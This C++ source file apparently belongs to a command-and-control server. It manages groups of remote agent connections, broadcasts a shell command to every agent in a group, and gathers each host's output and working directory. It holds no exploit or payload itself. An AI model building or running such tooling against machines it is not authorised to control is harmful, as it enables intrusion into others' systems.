#include "GroupManager.hpp"

BOOL GroupManager::CreateGroup(std::wstring wszGroupName) {
	std::lock_guard<std::mutex> lock(mGroupMapMutex);
	auto result = groupMap.emplace(wszGroupName, std::vector<AgentConnection*>());
	return result.second;
}

BOOL GroupManager::DeleteGroup(std::wstring wszGroupName)
{
	std::lock_guard<std::mutex> lock(mGroupMapMutex);

	if (groupMap.count(wszGroupName)) {
		auto& connectionsGroup = groupMap[wszGroupName];
		
		for (AgentConnection* conn : connectionsGroup) {
			conn->RemoveFromGroup(wszGroupName);
		}

		groupMap.erase(wszGroupName);
		return TRUE;
	}

	return FALSE;
}


VOID GroupManager::AddConnectionToGroup(std::wstring wszGroupName, AgentConnection* lpAgentConnection) {
	std::lock_guard<std::mutex> lock(mGroupMapMutex);
	groupMap[wszGroupName].push_back(lpAgentConnection);
	lpAgentConnection->AddToGroup(wszGroupName);
}

BOOL GroupManager::RemoveConnectionFromGroup(std::wstring wszGroupName, AgentConnection* lpAgentConnection) {
	std::lock_guard<std::mutex> lock(mGroupMapMutex);

	if (groupMap.count(wszGroupName)) {
		auto& connectionsGroup = groupMap[wszGroupName];
		auto connectionIterator = std::find(connectionsGroup.begin(), connectionsGroup.end(), lpAgentConnection);

		if (connectionIterator != connectionsGroup.end()) {
			(*connectionIterator)->RemoveFromGroup(wszGroupName);
			connectionsGroup.erase(connectionIterator);
			return TRUE;
		}
		else {
			return FALSE;
		}
	}
	return FALSE;
}

BOOL GroupManager::BroadcastToGroup(std::wstring wszGroupName, std::wstring wszCommand, std::wstring& wszOutput)
{
	std::wstring wszCwd;
	std::wstring wszResponse;
	std::vector<std::wstring> arrConnectionsCwds;
	std::lock_guard<std::mutex> lock(mGroupMapMutex);

	if (groupMap.count(wszGroupName)) {
		auto connectionsGroup = groupMap[wszGroupName];
		if (connectionsGroup.size()) {
			for (AgentConnection* conn : connectionsGroup) {
				conn->SendData(wszCommand);
				conn->GetDataFromQueue(wszResponse, -1);
				ParseAgentResponse(wszResponse, wszCwd);
				arrConnectionsCwds.push_back(L"\\\\" + conn->GetHostNameSessionStr() + L"\\" + wszCwd + L">\n");

				if (!wszResponse.empty()) {
					wszResponse = L"[*] received from " + conn->GetHostNameSessionStr() + L" : \n" + wszResponse + L"\n";
					wszOutput.append(wszResponse);
				}
			}

			for (std::wstring wszCurrentCwd : arrConnectionsCwds) {
				wszOutput.append(wszCurrentCwd);
			}

			return TRUE;
		}
		else {
			return FALSE;
		}
	}

	return FALSE;
}

BOOL GroupManager::ListGroupMembers(std::wstring wszGroupName, std::wstring& wszOutput) {
	std::lock_guard<std::mutex> lock(mGroupMapMutex);

	if (groupMap.count(wszGroupName)) {
		auto connectionsGroup = groupMap[wszGroupName];

		if (connectionsGroup.size()) {
			wszOutput += L"[*] Group " + wszGroupName + L" active connections:\n";
			for (AgentConnection* conn : connectionsGroup) {
				wszOutput += L"[*] IP: " + conn->GetSocketStr() + L" | Host: " + conn->GetHostNameSessionStr() + L"\n";
			}
		}
		else {
			wszOutput = L"[*] Group " + wszGroupName + L" is empty\n";
		}
		
		return TRUE;
	}

	wszOutput = L"[!] Group " + wszGroupName + L" doesn't exist\n";
	return FALSE;
}

VOID GroupManager::GetGroupNames(std::wstring& wszOutput)
{
	std::lock_guard<std::mutex> lock(mGroupMapMutex);
	if (groupMap.empty()) {
		wszOutput = L"[!] No groups found\n";
	}
	else {
		for (const auto& keyPair : groupMap) {
			wszOutput += L"[*] " + keyPair.first + L"\n";
		}
	}
}

BOOL GroupManager::CheckGroupExists(std::wstring wszGroupName)
{
	if (groupMap.count(wszGroupName)) {
		if (groupMap[wszGroupName].size() > 0) {
			return TRUE;
		}
		return FALSE;
	}
	return FALSE;
}

VOID GroupManager::ParseAgentResponse(std::wstring& wszOutCleanedResp, std::wstring& wszCwd)
{
	wszCwd.clear();
	size_t last_char_pos = wszOutCleanedResp.find_last_not_of(L" \t\r\n");
	wszOutCleanedResp.resize(last_char_pos + 1);
	size_t last_newline_pos = wszOutCleanedResp.find_last_of('\n');

	if (last_newline_pos == std::string::npos) {
		wszCwd = wszOutCleanedResp;
		wszOutCleanedResp.clear();
	}
	else {
		wszCwd = wszOutCleanedResp.substr(last_newline_pos + 1);
		wszOutCleanedResp.erase(last_newline_pos);
		wszOutCleanedResp.append(L"\n");
	}
}


